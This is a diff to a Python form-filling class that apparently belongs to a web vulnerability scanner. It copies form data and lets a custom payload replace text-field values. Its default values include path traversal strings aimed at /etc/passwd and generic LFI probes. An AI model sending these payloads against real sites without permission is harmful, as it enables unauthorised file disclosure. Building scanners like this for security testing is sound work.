@@ -1,11 +1,12 @@
 __author__ = 'Sun Fei'
 
 import requests
+import copy
 
 class Form(object):
     def __init__(self,url,formdata):
         self.url = url
-        self.formdata = formdata
+        self.formdata = copy.deepcopy(formdata)
         self.type_dictionary = {"text": "../../../../../../../../../../../../../../etc/passwd",
                                 "email": "../../../../../../../../../../lfi",
                                 "password": "../../../../../../../../../../lfi",
@@ -29,7 +30,7 @@ class Form(object):
                                 "name":"abcasdfa",
                                 "file":"asdfaf"}
 
-    def fill_entries(self,filter_type=None):
+    def fill_entries(self,filter_type=None, payload=''):
         action = self.formdata["action"]
         method = self.formdata["method"].lower()
         if method =="post" or method == "get":
@@ -45,6 +46,8 @@ class Form(object):
                                 value = splitString[1]
                             elif type in self.type_dictionary.keys():
                                 value = self.type_dictionary[type]
+                                if type == "text" and payload != '':
+                                    value = payload
                             else:
                                 value =''
                             yield name, value
